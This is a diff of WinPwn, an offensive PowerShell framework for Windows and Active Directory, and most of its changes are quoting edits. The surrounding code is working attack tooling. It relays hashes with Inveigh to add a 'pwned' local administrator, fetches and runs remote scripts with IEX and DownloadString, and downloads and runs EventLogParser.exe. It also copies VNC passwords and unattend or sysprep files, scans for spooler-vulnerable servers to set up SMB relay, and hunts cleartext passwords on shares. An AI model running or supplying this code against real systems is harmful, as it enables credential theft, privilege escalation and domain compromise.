@@ -162,7 +162,7 @@ function Inveigh {
 
         Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target $target -Command "net user pwned 0WnedAccount! /add; net localgroup $admingroup pwned /add" -Attack Enumerate,Execute,Session
 
-        Write-Host "You can now check your sessions with Get-Inveigh -Session and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further recon/exploitation"
+        Write-Host 'You can now check your sessions with Get-Inveigh -Session and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further recon/exploitation'
     }
 }
 
@@ -181,8 +181,8 @@ function adidnswildcard
     {
         IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecureThisShit/Creds/master/Powermad.ps1")
         New-ADIDNSNode -Node * -Tombstone -Verbose
-        Write-Host -ForegroundColor Red "Be sure to remove the record with `Disable-ADIDNSNode -Node * -Verbose` at the end of your tests"
-        Write-Host -ForegroundColor Yellow "Starting Inveigh to capture all theese mass hashes:"
+        Write-Host -ForegroundColor Red 'Be sure to remove the record with `Disable-ADIDNSNode -Node * -Verbose` at the end of your tests'
+        Write-Host -ForegroundColor Yellow 'Starting Inveigh to capture all theese mass hashes:'
         Inveigh
     }
            
@@ -291,6 +291,7 @@ function localreconmodules
             Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
             
             Write-Host -ForegroundColor Yellow 'Parsing Event logs for sensitive Information:'
+            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
             Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/EventLogParser.exe' -Outfile "$currentPath\EventLogParser.exe"
             EventLogParser.exe eventid=4103 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
             EventLogParser.exe eventid=4104 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
@@ -371,11 +372,11 @@ function localreconmodules
             If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password" >> "$currentPath\LocalRecon\VNCPassword.txt"}
             If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password >> "$currentPath\LocalRecon\RealVNCPassword.txt"}
 
-            If (Test-Path -Path C:\unattend.xml){copy C:\unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow "Unattended.xml Found, check it for passwords"}
-            If (Test-Path -Path C:\Windows\Panther\Unattend.xml){copy C:\Windows\Panther\Unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow "Unattended.xml Found, check it for passwords"}
-            If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){copy C:\Windows\Panther\Unattend\Unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow "Unattended.xml Found, check it for passwords"}
-            If (Test-Path -Path C:\Windows\system32\sysprep.inf){copy C:\Windows\system32\sysprep.inf "$currentPath\LocalRecon\sysprep.inf"; Write-Host -ForegroundColor Yellow "Sysprep.inf Found, check it for passwords"}
-            If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){copy C:\Windows\system32\sysprep\sysprep.xml "$currentPath\LocalRecon\sysprep.inf"; Write-Host -ForegroundColor Yellow "Sysprep.inf Found, check it for passwords"}
+            If (Test-Path -Path C:\unattend.xml){copy C:\unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
+            If (Test-Path -Path C:\Windows\Panther\Unattend.xml){copy C:\Windows\Panther\Unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
+            If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){copy C:\Windows\Panther\Unattend\Unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
+            If (Test-Path -Path C:\Windows\system32\sysprep.inf){copy C:\Windows\system32\sysprep.inf "$currentPath\LocalRecon\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
+            If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){copy C:\Windows\system32\sysprep\sysprep.xml "$currentPath\LocalRecon\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
 
             Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue >> "$currentPath\LocalRecon\webconfigfiles.txt"
 
@@ -401,7 +402,7 @@ function localreconmodules
                 {
                     invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/gfoss/PSRecon/master/psrecon.ps1'' -Outfile .\LocalRecon\Psrecon.ps1;Write-Host -ForegroundColor Yellow ''Starting PsRecon:'';.\LocalRecon\Psrecon.ps1;pause}'
                 }
-                Write-Host -ForegroundColor Yellow "Saving general computer information to $currentPath\LocalRecon\Computerdetails.txt:"
+                Write-Host -ForegroundColor Yellow 'Saving general computer information to .\LocalRecon\Computerdetails.txt:'
                 Get-ComputerDetails >> "$currentPath\LocalRecon\Computerdetails.txt"
 
                 Write-Host -ForegroundColor Yellow 'Starting WINSpect:'
@@ -565,20 +566,20 @@ function domainreconmodules
                     {
                         if (spoolscan -target $domc)
                         {
-                            Write-Host -ForegroundColor Yellow "Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now"
+                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now'
                             echo "$domc" >> "$currentPath\DomainRecon\MS-RPNVulnerableDC_$domc.txt"
                         }
                     }
 		    $othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain? (yes/no)'
             	    if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
                     {
-		    	Write-Host -ForegroundColor Yellow "Searching for active Servers in the domain, this can take a while depending on the domain size"
+		    	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
 		    	$ActiveServers = Get-DomainComputer -Ping -OperatingSystem "Windows Server*"
 			foreach ($acserver in $ActiveServers.dnshostname)
                     	{
                         	if (spoolscan -target $acserver)
                         	{
-                            		Write-Host -ForegroundColor Yellow "Found vulnerable Server - $acserver. You can take the DC-Hash for SMB-Relay attacks now"
+                            		Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. You can take the DC-Hash for SMB-Relay attacks now'
                             		echo "$acserver" >> "$currentPath\DomainRecon\MS-RPNVulnerableServers.txt"
                         	}
                     	}
@@ -588,17 +589,17 @@ function domainreconmodules
 	    $domainsharepass = Read-Host -Prompt 'Check Domain Network-Shares for cleartext passwords using passhunt.exe? (yes/no)'
             if ($domainsharepass -eq "yes" -or $domainsharepass -eq "y" -or $domainsharepass -eq "Yes" -or $domainsharepass -eq "Y")
             {
-                Write-Host -ForegroundColor Yellow "Collecting active Windows Servers from the domain..."
+                Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
                 $ActiveServers = Get-DomainComputer -Ping -OperatingSystem "Windows Server*"
                 $ActiveServers.dnshostname >> "$currentPath\DomainRecon\activeservers.txt"
                 
-                Write-Host -ForegroundColor Yellow "Searching for Shares on the found Windows Servers..."
+                Write-Host -ForegroundColor Yellow 'Searching for Shares on the found Windows Servers...'
                 Invoke-ShareFinder -ComputerFile "$currentPath\DomainRecon\activeservers.txt" -NoPing -CheckShareAccess | Out-File -Encoding ascii "$currentPath\DomainRecon\found_shares.txt"
                 
                 $shares = Get-Content "$currentPath\DomainRecon\found_shares.txt"
                 $testShares = foreach ($line in $shares){ echo ($line).Split(' ')[0]}
 
-                Write-Host -ForegroundColor Yellow "Starting Passhunt.exe for all found shares."
+                Write-Host -ForegroundColor Yellow 'Starting Passhunt.exe for all found shares.'
                 if (test-path $currentPath\passhunt.exe)
                 {
                     foreach ($line in $testShares)
@@ -622,7 +623,7 @@ function domainreconmodules
             Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
             Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SecureThisShit/Creds/master/ADRecon.ps1' -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
             Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
-            invoke-expression 'cmd /c start powershell -Command {.\DomainRecon\ADrecon\recon.ps1}'
+            cmd /c start powershell -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
 }
 
 
@@ -918,7 +919,7 @@ function groupsearch
     $user = Read-Host -Prompt 'Do you want to search for other users than the session-user? (yes/no)'
             if ($user -eq "yes" -or $user -eq "y" -or $user -eq "Yes" -or $user -eq "Y")
             {
-                Write-Host -ForegroundColor Yellow "Please enter a username to search for:"
+                Write-Host -ForegroundColor Yellow 'Please enter a username to search for:'
                 $username = Get-Credential
                 $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                 Write-Host -ForegroundColor Yellow 'Searching...:'
@@ -929,7 +930,7 @@ function groupsearch
                 $group = Read-Host -Prompt 'Please enter a Group-Name to search for: (Administrators,RDP)'
                 Write-Host -ForegroundColor Yellow 'Searching...:'
                 bGet-DomainGPOUserLocalGroupMapping -LocalGroup $group -Identity $env:UserName >> $currentPath\Groupsearches.txt
-                Write-Host -ForegroundColor Yellow "Systems saved to >> $currentPath\Groupsearches.txt:"
+                Write-Host -ForegroundColor Yellow 'Systems saved to >> $currentPath\Groupsearches.txt:'
             }
 }
 
@@ -992,11 +993,11 @@ function WinPwn
 
     if (isadmin)
     {
-        Write-Host -ForegroundColor Green "Elevated PowerShell session detected. Continuing."
+        Write-Host -ForegroundColor Green 'Elevated PowerShell session detected. Continuing.'
     }
     else
     {
-        Write-Host -ForegroundColor Red "Only running non-elevated PowerShell commands. Please launch an elevated session if you have local Administrator Credentials and try again."
+        Write-Host -ForegroundColor Red 'Only running non-elevated PowerShell commands. Please launch an elevated session if you have local Administrator Credentials and try again.'
     }
     Write-Host -ForegroundColor Yellow 'Getting Scripts to Memory'
     
